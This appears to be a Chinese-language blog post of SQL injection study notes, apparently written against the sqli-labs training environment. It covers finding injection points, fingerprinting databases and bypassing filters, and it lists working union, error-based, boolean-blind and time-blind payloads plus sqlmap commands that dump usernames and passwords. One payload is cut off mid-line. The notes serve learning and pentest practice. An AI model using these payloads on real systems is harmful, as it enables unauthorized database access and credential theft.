---
title: SQL注入思路
categories:
  - 学习
tags:
  - SQL注入
abbrlink: 7ba791c1
---

- **SQL注入分类：**

   - 回显正常---> 联合查询` union select`
   
   - 回显报错-->报错注入：
            
   
     1. `extractvalue()`
     2. `updatexml()`
     3. `floor(rand()\*2)`
   
   - 盲注：
   
     布尔盲注
   
     时间盲注

## 判断注入点

在GET参数、POST参数、Cookie、Referer、XFF、UA等地方尝试插入代码、符号或语句，尝试是否存在数据库参数读取行为，以及能否对其参数产生影响，如产生影响则说明存在注入点。

**sql注入点类型**

1. get注入
   在get传参时写入参数，将SQl语句闭合，后面加写入自己的SQL语句。
2. post注入
   通过post传参，原理与get一样，重要的是判断我们所输入的信息是否与数据库产生交互，其次判断SQL语句是如何闭合的。
3. 有些网站通过查询cookie判断用户是否登录，需要与数据库进行交互，我们可以修改cookie的值，查找我们所需要的东西。或者通过报错注入是网页返回报错信息。
4. Referer注入
   Referer正确写法应该是Referrer,因为http规定时写错只能将错就错，有些网站会记录ip和访问路径，例如百度就是通过Referer来统计网站流量，我们将访问路径进行SQL注入，同样也可以得到想要的信息。
5. XFF注入
   在用户登录注册模块在 HTTP 头信息添加 X-Forwarded-for: 9.9.9.9' ，用户在注册的时候，如果存在安全隐 患，会出现错误页面或者报错。从而导致注册或者登录用户失败。
   burpsuite 抓包，提交输入检测语句：
   X-Forwarded-for: 127.0.0.1'and 1=1#
   X-Forwarded-for: 127.0.0.1'and 1=2#
   两次提交返回不一样，存在 SQL 注入漏洞
6. UA注入
   输入点在User-Agent

## 判断数据库类型
判断网站使用的是哪个数据库，常见数据库如：
MySQL、MSSQL(即SQLserver)、Oracle、Access、PostgreSQL、db2等等

常用SQL注入判断数据库方法
● 使用数据库特有的函数来判断
● 使用数据库专属符号来判断，如注释符号、多语句查询符等等
● 报错信息判断
● 数据库特性判断

1. 端口扫描
   如果可以对主机进行端口扫描，可以根据是否开启对应端口，来大概判断数据库类型。
   Oracle
   默认端口号：1521
   SQL Server
   默认端口号：1433
   MySQL
   默认端口号：3306
   PostgreSql
   默认端口号：5432

2. 网站类型与数据库的联系
   asp：SQL Server，Access
   .net ：SQL Server
   php：Mysql，PostgreSql
   java：Oracle，Mysql

3. 根据注释符判断
   “#”是MySQL中的注释符，返回错误说明该注入点可能不是MySQL，另外也支持’-- ',和/* */注释（注意mysql使用-- 时需要后面添加空格）

   “null”和“%00”是Access支持的注释。

​       “--”是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。

​       “;”是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。

## 判断参数数据类型
通过+1、-1、and 1=1、and 1=2、注释符。与其各种变种如与各种符号结合的and 1=1、and '1'='1等等判断参数数据类型。先判断是否是整型，如果不是整型则为字符型，字符型存在多种情况，需要使用单引号【'】、双引号【"】、括号【()】多种组合方式进行试探。
类似判断闭合方式
id=1 and 1=1回显正常 id=1 and1=2回显错误（判断为整形）
【原因：and 1=1或者and 1=2 写入了sql语句并且执行成功 因为1=2是错误所以id=1 and 1=2回显是错误的】
id=1 and 1=1和id=1 and 1=2回显正常（判断为字符型接下来判断闭合方式）
id=1' and '1'='1回显正确id=1' and '1'='2回显错误（判断为【'】闭合）
id=1" and "1"="1 回显正常 id=1" and "1"="2回显错误（判断为【"】闭合）
【原因同上】
判断为闭合方式为【'】型
以上注入不成功的时候尝试
1%df’ 此为宽字节注入
参数类型一般有数值型，字符型

1. 数值型
   前台页面输入的参数是「数字」。

   比如下面这个根据ID查询用户的功能。后台对应的SQL如下，字段类型是数值型，这种就是数值型注入。
   `select * from user where id = 1;`
   写入and1=1 与and1=2回显不相同说明后面的and1=1和and1=2对网页造成了影响，判断为数值型

2. 字符型
   前台页面输入的参数是「字符串」。
   比如下面这个登录功能，输入的用户名和密码是字符串。

   后台对应的SQL如下，字段类型是字符型，这种就是字符型注入。
   `select * from user where username = 'zhangsan' and password = '123abc';`
   字符可以使用单引号包裹，也可以使用双引号包裹，根据包裹字符串的「引号」不同，字符型注入可以分为：「单引号字符型」注入和「双引号字符型」注入。	

   1、单引号字符型注入
   参数使用「单引号」包裹时，叫做单引号字符型注入，比如下面这个SQL，就是单引号字符型注入。
   `select * from user where username = 'zhangsan';`
   2、双引号字符型注入
   参数使用「双引号」包裹时，叫做双引号字符型注入，比如下面这个SQL，就是双引号字符型注入。
   `select * from user where username = "zhangsan";`
   3、带有括号的注入
   理论上来说，只有数值型和字符型两种注入类型。
   SQL的语法，支持使用一个或多个「括号」包裹参数，使得这两个基础的注入类型存在一些变种。
       a. 数值型+括号的注入
       使用括号包裹数值型参数，比如下面这种SQL。

   ​    `select \* from user where id = (1);`
   ​    `select \* from user where id = ((1));`
   ​    b. 单引号字符串+括号的注入
   ​    使用括号和单引号包裹参数，比如下面这种SQL。

   ​    `select \* from user where username = ('zhangsan');`
   ​    `elect \* from user where username = (('zhangsan'));`
   ​    c. 双引号字符串+括号的注入
   ​    使用括号和双引号包裹参数，比如下面这种SQL

   ​    `select \* from user where username = ("zhangsan");`
   ​    `select \* from user where username = (("zhangsan"));`

## 判断数据库语句过滤情况

正常输入sql语句如果通过查看回显来判断语句是否被过滤

1. 判断列数
   如果order by被过滤则尝试绕过，如果无法绕过就无法得到列数，这时就无法使用联合查询注入。
2. 判断显示位
   如果页面没有显示位，同样无法使用联合查询注入。
3. 报错信息
   如果没有报错信息返回，则无法使用报错注入。

## 绕过 过滤

正常进行sql注入，通过回显来判断数据是否被过滤

1.过滤关键字
过滤关键字应该是最常见的过滤了，因为只要把关键字一过滤，你的注入语句基本就不起作用了。
绕过方法：

1、最常用的绕过方法就是用**//，<>，分割关键字

```
sel<>ect   sel/**/ect
```

2、根据过滤程度，有时候还可以用双写绕过

```
selselectect
```

3、既然是过滤关键字，大小写应该都会被匹配过滤，所以大小写绕过一般是行不通的。

4、有时候还可以使用编码绕过

1）url编码绕过
2）16进制编码绕过
3）ASCII编码绕过

2.过滤逗号
常见的几种注入方法基本上都要使用逗号，要是逗号被过滤了，那就只能想办法绕过了。
绕过方法：
1、简单注入可以使用join方法绕过
 原语句：`union select 1,2,3`
join语句：`union select * from (select 1)a join (select 2)b join (select 3)`

2、对于盲注的那几个函数substr(),mid(),limit

 `substr`和`mid()`可以使用from for的方法解决
`substr(str from pos for len)` //在str中从第pos位截取len长的字符
`mid(str from pos for len)`//在str中从第pos位截取len长的字符
`limit`可以用offset的方法绕过
 `limit 1 offset 1`
使用substring函数也可以绕过
 `substring(str from pos)` //返回字符串str的第pos个字符，索引从1开始

 3.过滤空格
空格被过滤有以下几种方法绕过：

1、双空格 
 2、/**/ 
 3、用括号绕过 
 4、用回车代替 //ascii码为chr(13)&chr(10)，url编码为%0d%0a

 4.过滤等号
如果等号被过滤了我们可以用 like 代替
使用like 、rlike 、regexp 或者 使用< 或者 >

5.过滤大于小于号
盲注中我们经常需要用到比较符，如果他们被过滤了，我们可以用以下几种方法绕过：

1、`greatest(n1,n2,n3,...)`		//返回其中的最大值
2、`strcmp(str1,str2)`		//当str1=str2，返回0，当str1>str2，返回1，当str1<str2，返回-1
3、in 操作符
4、`between   and`		//选取介于两个值之间的数据范围。这些值可以是数值、文本或者日期。

## 根据注入情况使用注入方式

使用id=1进行尝试尝试 继续使用order by 查询显示位 union select 1，2，3 查询无显示，即无法得到显示位或无法得到列数时放弃使用联合查询
尝试使用报错语句?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+等没有报错信息显示时放弃使用报错注入
尝试使用布尔盲注和时间盲注

1.联合查询注入

​	前提：知道列数且页面上有显示位。
​	判断显示位、获取所有数据库名、获取指定数据库所有表名、获取指定数据库指定表中所有字段名、获取具体数据。

```
	列数

	select id,username,password from security.users where id=1 order by 1;

​	显示位

	select id,username,password from security.users where id=1 union select 1,2,3;

​	所有数据库名

	?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+
	
​	指定数据库中表名

	?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
​	具体数据
	?id=-1' union select 1,2,group_concat(username,password) from users --+	
```

2.报错注入

​	前提：页面会显示数据库报错信息。
​	得到报错信息、获取所有数据库名、获取指定数据库所有表名、获取指定数据库指定表中所有字段名、获取具体数据。

```
	数据库名
	?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
	或?id=1' and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a) --+
	
​	所有数据库名
	?id=1' and updatexml(1,concat(0x7e,(select group_concat(schema_name)from information_schema.schemata),0x7e),1) --+   由于无法像联合查询一样一次性看到所有数据库名称，就需要使用limit参数逐个查询
	?id=1' and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),floor (rand()*2)) as x from information_schema.tables group by x) as a) --+
	
​	指定数据库中表名
	?id=1' and (select 1 from (select count(*),concat(((select concat(table_name) from information_schema.tables where table_schema='security' limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+
	
​	指定数据库中指定表中所有字段名
	?id=1' and (select 1 from (select count(*),concat((select concat(column_name,';') from information_schema.columns where table_name='users' limit 0,1),floor(rand()*2)) as x from information_schema.columns group by x) as a) --+
	
​	具体数据
	?id=1' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','Angelina'))))--+
	或使用limit挨个遍历
	?id=1' and (select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x3a,p

```

3.布尔盲注

​	情况：没有显示位、没有报错信息，但是有SQL语句执行错误信息输出的场景，仅仅通过报错这一行为去判断SQL注入语句是否执行	成功。（用脚本更方便）

```
	数据库长度

	?id=1' and (length(database()))>7 --+	
	?id=1' and (length(database()))>8 --+
	
​	数据库名
	?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+或?id=1' and (select 1 from (select 	count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a) --+
	
​	所有数据库名
	?id=1' and updatexml(1,concat(0x7e,(select group_concat(schema_name)from information_schema.schemata),0x7e),1) --+

	?id=1' and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),floor (rand()*2)) as x from information_schema.tables group by x) as a) --+
	
​	指定数据库中表名
	?id=1' and (select 1 from (select count(*),concat(((select concat(table_name) from information_schema.tables where table_schema='security' limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+
	
​	指定数据库中指定表中所有字段名
	?id=1' and (select 1 from (select count(*),concat((select concat(column_name,';') from information_schema.columns where table_name='users' limit 0,1),floor(rand()*2)) as x from information_schema.columns group by x) as a) --+
​	具体数据
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','Angelina'))))--+

```

```
脚本

```

4.时间盲注
	前提：页面上没有显示位，也没有输出SQL语句执行错误信息。 正确的SQL语句和错误的SQL语句返回页面都一样，但是加入	sleep(5)条件之后，页面的返回速度明显慢了5秒。
	缺点：因为是通过sleep()函数影响的响应时间来判断语句是否执行，所以比布尔盲注更慢，真实环境下时间盲注一个注入点需要跑大概五六个小时。

```
	猜解数据库
	数据库个数
	?id=1 and if((select count(schema_name) from information_schema.schemata)=9,sleep(5),1)
	第一个数据库名有多少个字符

	?id=1 and if((select length(schema_name) from information_schema.schemata limit0,1)=18,sleep(5),1)
	判断第一个库第一个字符
	?id=1 and if((select ascii(substr((select schema_name from information_schema.schemata limit0,1),1,1)))=105,sleep(5),1)
	判断第一个库第二个字符
	?id=1 and if((select ascii(substr((select schema_name from information_schema.schemata limit0,1),2,1)))=110,sleep(5),1)
​	当前数据库
	当前数据库长度	
	?id=1'+and+if((length(database()))=7,sleep(5),1) --+
	?id=1'+and+if((length(database()))=8,sleep(5),1) --+
​	当前数据库名
	?id=1' and if(ascii(substr(database(),1,1))>114,1,sleep(5))--+
​	猜解表名
	?id=1' and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=108,sleep(5),1) --+
	URL编码后：
	?id=1%27%20and%20if((ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20t
able_schema=database()%20limit%200,1),1,1)))=108,sleep(5),1)%20--+
​	猜解字段名
	?id=1' and if((ascii(substr((select column_name from information_schema.columns where table_name='表名' limit 1,1),1,1)))=102,sleep(5),1) --+
	URL编码后：
?id=1%27%20and%20if((ascii(substr((select%20column_name%20from%20information_schema.columns%20
where%20table_name=%27users%27%20limit%201,1),1,1)))=102,sleep(5),1)%20--+
​	猜解具体数据
	?id=1' and if((ascii(substr((select 字段名 from 表名 limit 0,1),1,1)))=102,sleep(5),1) --+

```

## 使用工具进行注入

**sqlmap**

```
	基础探测命令
	联合查询注入：
	.\sqlmap.py -u "http://192.168.xxx.xxx/sqli/Less-1/?id=1" --dbms=MySQL --technique=U -v 3
	
	报错注入：
	.\sqlmap.py -u "http://192.168.xxx.xxx/sqli/Less-1/?id=1" --dbms=MySQL --technique=E -v 3
	
	布尔盲注：
	.\sqlmap.py -u "http://192.168.xxx.xxx/sqli/Less-1/?id=1" --dbms=MySQL --technique=B -v 3
	
	时间盲注：
	.\sqlmap.py -u "http://192.168.xxx.xxx/sqli/Less-1/?id=1" --dbms=MySQL --technique=T -v 3

```

爆破数据
`--current-db `当前使用的数据库
`--dbs `列出数据库信息
`-D `指定数据库，爆破指定数据库中的表
`-D` 数据库名 --tables
`-T` 指定数据表名，爆破指定表中的字段
`-D` 库名 -T 表名 --columns
`-C` 指定字段名，爆破具体数据
`--dump` 将数据导出、转储
指定库、表、字段，查询具体数据
`.\sqlmap.py -u "http://192.168.xxx.xxx/sqli/Less-1/?id=1" --dbms=MySQL --technique=T -v 3 -D security -T users -C username,password --dump`
